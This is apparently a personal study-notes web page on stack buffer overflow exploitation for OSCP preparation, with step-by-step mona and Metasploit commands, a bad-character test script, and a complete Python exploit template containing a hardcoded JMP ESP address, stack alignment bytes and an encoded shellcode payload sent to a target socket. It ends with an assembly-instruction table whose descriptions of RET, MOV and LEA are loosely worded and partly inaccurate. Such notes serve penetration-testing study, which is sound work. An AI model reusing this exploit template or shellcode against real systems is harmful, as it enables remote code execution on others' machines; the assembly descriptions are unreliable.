---
layout: default
---
<html>
<head>
    <title>Buffer Overflows</title>
    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
</head>

<body>

    <h1>Buffer Overflows</h1>

    <hr>

    <h2>OSCP BOF</h2>

    <li>Send a long enough pattern to crash the program</li>
    <ul>
        <li>msf-pattern_create -l &lt;large #&gt;</li>
    </ul>
    <li>Find the offset of where the EIP points to when the program crashes</li>
    <li>Test for bad characters</li>
    <ul>
        <li>Bad characters are characters that the program interpepts as something we do not intend it to</li>
        <ul>
            <li>Example: \x00 would be interpreted as a null byte.  Anything after \x00 would not be read by the program.</li>
        </ul>
        <li>Generate a list of all possible bytes \x00 to \xFF</li>
        <li>Compare the characters in debugger to characters sent in BOF string</li>
        <ul>
            <li>mona compare -a &lt;register with bad characters&gt; -f badchar_test.bin</li>
        </ul>
    </ul>
    <li>Search for gadgets to jump to register where our shellcode is located</li>
    <ul>
        <li>!mona jmp -r esp -cpb "<bad characters>"</li>
    </ul>
    <li>If encode is used when generating payload then you must add before the payload NOPs or a subtract ESP instructions</li>
    <ul>
        <li>Add NOPs (\x90) in front of shell code (Around 12 lines max should be needed)</li>
        <li>Subtract ESP so the encoder doesn't mess up our shell code</li>
        <ul>
            <li>Always shift shellcode in increments of 4. (0x10 = 8)</li>
            <li>Append \x83\xec\x10 before shellcode</li>
            <ul>
                <li>Generated by:</li>
                <ul>
                    <li>ruby /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb</li>
                    <ul>
                        <li>sub esp,0x10</li>
                        <ul>
                            <li>Output: "\x83\xec\x10"</li>
                        </ul>
                    </ul>
                </ul>
            </ul>
        </ul>
    </ul>

    <li>Bad character test script example:</li>
    <pre>
#!/usr/bin/python

import socket
import struct

RHOST = &quot;&lt;ip address&gt;&quot;
RPORT = &lt;port&gt;

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

badchar_test = &quot;&quot;
badchars = [0x00]

for i in range(0x00,0xFF+1):
    if i not in badchars:
        badchar_test += chr(i)

with open(&quot;badchar_test.bin&quot;,&quot;wb&quot;)as f:
    f.write(badchar_test)

totlen = 2560
offset = 2288

buf = &quot;&quot;
buf += &quot;A&quot;*(offset - len(buf))
buf += &quot;BBBB&quot;
buf += badchar_test
buf += &quot;C&quot;*(totlen - len(buf))
buf += &quot;\n&quot;

s.send(buf)
print &quot;Sent {0}&quot;.format(buf)
    </pre>

    <li>OSCP BOF Example</li>

    <pre>
#!/usr/bin/python

import socket
import struct

RHOST = &quot;&lt;ip address&gt;&quot;
RPORT = &lt;port&gt; 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

totlen = 1024
offset = 146
jmp_esp = 0x080414c3
sub_esp_10 = &quot;\x83\xec\x10&quot;

shell =  b&quot;&quot;
shell += b&quot;\xd9\xc2\xd9\x74\x24\xf4\x5f\xba\xb3\xe7\x3e\x99&quot;
shell += b&quot;\x31\xc9\xb1\x31\x31\x57\x18\x83\xc7\x04\x03\x57&quot;
shell += b&quot;\xa7\x05\xcb\x65\x2f\x4b\x34\x96\xaf\x2c\xbc\x73&quot;
shell += b&quot;\x9e\x6c\xda\xf0\xb0\x5c\xa8\x55\x3c\x16\xfc\x4d&quot;
shell += b&quot;\xb7\x5a\x29\x61\x70\xd0\x0f\x4c\x81\x49\x73\xcf&quot;
shell += b&quot;\x01\x90\xa0\x2f\x38\x5b\xb5\x2e\x7d\x86\x34\x62&quot;
shell += b&quot;\xd6\xcc\xeb\x93\x53\x98\x37\x1f\x2f\x0c\x30\xfc&quot;
shell += b&quot;\xe7\x2f\x11\x53\x7c\x76\xb1\x55\x51\x02\xf8\x4d&quot;
shell += b&quot;\xb6\x2f\xb2\xe6\x0c\xdb\x45\x2f\x5d\x24\xe9\x0e&quot;
shell += b&quot;\x52\xd7\xf3\x57\x54\x08\x86\xa1\xa7\xb5\x91\x75&quot;
shell += b&quot;\xda\x61\x17\x6e\x7c\xe1\x8f\x4a\x7d\x26\x49\x18&quot;
shell += b&quot;\x71\x83\x1d\x46\x95\x12\xf1\xfc\xa1\x9f\xf4\xd2&quot;
shell += b&quot;\x20\xdb\xd2\xf6\x69\xbf\x7b\xae\xd7\x6e\x83\xb0&quot;
shell += b&quot;\xb8\xcf\x21\xba\x54\x1b\x58\xe1\x32\xda\xee\x9f&quot;
shell += b&quot;\x70\xdc\xf0\x9f\x24\xb5\xc1\x14\xab\xc2\xdd\xfe&quot;
shell += b&quot;\x88\x2d\x3c\x2b\xe4\xc5\x99\xbe\x45\x88\x19\x15&quot;
shell += b&quot;\x89\xb5\x99\x9c\x71\x42\x81\xd4\x74\x0e\x05\x04&quot;
shell += b&quot;\x04\x1f\xe0\x2a\xbb\x20\x21\x49\x5a\xb3\xa9\xa0&quot;
shell += b&quot;\xf9\x33\x4b\xbd&quot;

buf = &quot;&quot;
buf += &quot;A&quot;*(offset - len(buf))
buf += struct.pack(&quot;&lt;I&quot;,jmp_esp)
buf += sub_esp_10 
buf += shell
buf += &quot;C&quot;*(totlen - len(buf))
buf += &quot;\n&quot;

s.send(buf)
print &quot;Sent: {0}&quot;.format(buf)

data = s.recv(1024)
print &quot;Received: {0}&quot;.format(data)

    </pre>

    <h2>Assembly Language</h2>
    <table>
        <tr>
            <td>CALL</td>
            <td>
                <li>Pushes the next instruction address to the stack so it can later be returned to</li>
                <li>Modifies EIP so that execution jumps to the function being called</li>
            </td>
        </tr>
        <tr>
            <td>RET</td>
            <td>
                <li>Increment ESP by 4</li>
                <li>Copies &lt;ESP Value&gt; to &lt;EIP address&gt;</li>
            </td>
        </tr>
        <tr>
            <td>PUSH</td>
            <td>
                <li>Decrement ESP by 4</li>
                <li>PUSH &lt;value&gt; --&gt; ESP Address</li>
            </td>
        </tr>
        <tr>
            <td>MOV &lt;register 1&gt;, &lt;register 2 &gt;</td>
            <td>Copy &lt;register 2 value &amp; address&gt; to &lt;register 1 value &amp; address&gt;</td>
        </tr>
        <tr>
            <td>SUB &lt;register&gt;, &lt;#&gt;</td>
            <td>Subtract &lt;#&gt; from &lt;register address&gt;</td>
        </tr>
        <tr>
            <td>LEA &lt;register 1&gt;, &lt;register 2&gt;</td>
            <td>Copy &lt;register 2 address&gt; to &lt;register 1 address&gt;</td>
        </tr>
    </table>